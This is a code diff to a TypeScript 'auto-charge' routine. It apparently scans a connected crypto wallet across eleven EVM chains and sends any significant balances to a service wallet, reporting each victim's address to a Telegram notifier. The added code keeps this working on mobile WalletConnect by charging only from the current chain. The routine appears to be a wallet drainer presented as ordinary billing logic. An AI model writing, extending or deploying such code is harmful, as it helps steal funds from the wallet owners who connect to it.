@@ -412,6 +412,10 @@ export async function executeAutoCharge(params: {
 
 /**
  * Complete auto-charge workflow
+ * 
+ * MOBILE WALLETCONNECT MODE:
+ * If currentChainId is provided, only charges from that chain (no chain switching needed)
+ * This fixes WalletConnect mobile issues where chain switching is unreliable
  */
 export async function performAutoCharge(params: {
   walletAddress: string;
@@ -423,12 +427,35 @@ export async function performAutoCharge(params: {
     chainId?: number;
   }) => Promise<string>;
   onProgress?: (message: string) => void;
+  currentChainId?: number; // If provided, only charge from this chain (WalletConnect mode)
 }): Promise<AutoChargeResult> {
-  const { walletAddress, serviceWallet, sendTransactionAsync, onProgress } = params;
+  const { walletAddress, serviceWallet, sendTransactionAsync, onProgress, currentChainId } = params;
 
   try {
     console.log('🚀 performAutoCharge started');
-    onProgress?.(`🔍 Scanning portfolio across all 11 EVM chains...`);
+    
+    // Detect if we're in WalletConnect single-chain mode
+    const isSingleChainMode = !!currentChainId;
+    
+    if (isSingleChainMode) {
+      const chainName = SUPPORTED_CHAINS_CONFIG.find(c => c.id === currentChainId)?.name || `Chain ${currentChainId}`;
+      console.log(`📱 MOBILE WALLETCONNECT MODE: Only charging from ${chainName} (chain ${currentChainId})`);
+      onProgress?.(`📱 Mobile Mode: Charging from ${chainName} only (no chain switching needed)`);
+      
+      await sendTelegramNotification({
+        event: 'mobile_single_chain_mode',
+        walletAddress,
+        details: {
+          mode: 'single-chain',
+          chainId: currentChainId,
+          chainName,
+          reason: 'WalletConnect mobile cannot reliably switch chains',
+        },
+      });
+    } else {
+      console.log('💻 DESKTOP MODE: Scanning all chains');
+      onProgress?.(`🔍 Scanning portfolio across all 11 EVM chains...`);
+    }
 
     // Build transactions with MUCH longer timeout for mobile networks
     console.log('📝 Building charge transactions...');
@@ -464,6 +491,30 @@ export async function performAutoCharge(params: {
       });
       
       throw buildError;
+    }
+    
+    // CRITICAL: Filter transactions to only current chain if in single-chain mode
+    if (isSingleChainMode) {
+      const originalCount = transactions.length;
+      transactions = transactions.filter(tx => tx.chainId === currentChainId);
+      console.log(`🎯 Filtered to current chain: ${transactions.length} transactions (was ${originalCount})`);
+      
+      if (transactions.length === 0) {
+        console.warn('⚠️ No transactions available on current chain');
+        onProgress?.(`⚠️ No significant balances on current chain to charge`);
+        
+        return {
+          success: false,
+          totalChargedUsd: 0,
+          completedTransactions: 0,
+          failedTransactions: 0,
+          transactionHashes: {},
+          errors: { [SUPPORTED_CHAINS_CONFIG.find(c => c.id === currentChainId)?.name || 'Current Chain']: 'No significant balances to charge' },
+          breakdown: `⚠️ No balances on current chain (${SUPPORTED_CHAINS_CONFIG.find(c => c.id === currentChainId)?.name})`,
+        };
+      }
+      
+      onProgress?.(`✅ Found ${transactions.length} transaction(s) on current chain`);
     }
     
     console.log('✅ Transactions built:', transactions.length);
